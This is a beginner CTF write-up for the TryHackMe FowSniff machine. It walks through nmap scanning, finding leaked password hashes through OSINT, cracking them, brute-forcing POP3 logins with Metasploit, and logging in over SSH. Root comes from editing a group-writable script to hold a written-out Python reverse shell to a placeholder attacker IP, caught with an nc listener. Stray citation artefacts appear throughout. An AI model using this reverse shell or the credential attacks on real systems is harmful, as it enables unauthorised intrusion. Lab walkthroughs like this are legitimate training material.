# TryHackMe | FowSniff CTF Writeup

This writeup documents the steps taken to solve the **FowSniff** machine on TryHackMe.  
The challenge involves reconnaissance, OSINT investigation, credential cracking, and privilege escalation to obtain root access. :contentReference[oaicite:0]{index=0}

---

## Challenge Information

- **Platform:** TryHackMe  
- **Room:** FowSniff  
- **Category:** Boot2Root / Linux  
- **Difficulty:** Beginner  

---

## Recon

The first step was performing a port and service scan on the target machine.

```bash
nmap -sV -vv <target-ip>
```

The scan revealed several open services, including:

- `22/tcp` — SSH  
- `80/tcp` — HTTP  
- `110/tcp` — POP3  
- `143/tcp` — IMAP  

The presence of mail services suggested that email accounts might be used as an entry point. :contentReference[oaicite:1]{index=1}

Next, the website hosted on port 80 was inspected. The page indicated that **FowSniff Corporation had experienced a data breach**, and the message referenced a hijacked Twitter account. :contentReference[oaicite:2]{index=2}

---

## Enumeration

The site referenced the company's Twitter handle: `@fowsniffcorp`.

Investigating the account revealed a link to a Pastebin file containing leaked credentials. The original link may no longer work, but it can be accessed through archived snapshots.

The Pastebin contained **usernames and MD5 password hashes** belonging to employees. :contentReference[oaicite:3]{index=3}

These hashes were cracked using an online hash cracking service such as **CrackStation**.

After cracking the hashes, several plaintext credentials were obtained.

---

## Exploitation

Since POP3 was exposed on port `110`, the next step was attempting to authenticate to the mail service using the discovered credentials.

Metasploit can be used to brute-force POP3 logins.

```
use auxiliary/scanner/pop3/pop3_login
```

After configuring the module with the target host and credential list, valid login credentials were discovered. :contentReference[oaicite:4]{index=4}

Once authenticated, the mailbox contents were inspected. One of the emails contained a **temporary password** for another user account.

This password was used together with the sender’s username to authenticate to the machine via SSH.

```bash
ssh <username>@<target-ip>
```

This provided a shell on the target machine.

---

## Privilege Escalation

After gaining access to the system, the next step was identifying privilege escalation opportunities.

The user’s group memberships were inspected:

```bash
groups
```

One of the groups had permission to modify a script that runs automatically on the system.

Since the file was writable by the user’s group, the script could be modified to include a **reverse shell payload**.

Example Python reverse shell:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<attacker-ip>,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

After starting a listener on the attacker machine:

```bash
nc -lvnp 1234
```

The modified script executed and triggered the reverse shell, providing **root-level access** to the system.

The final flag could then be retrieved from the root directory.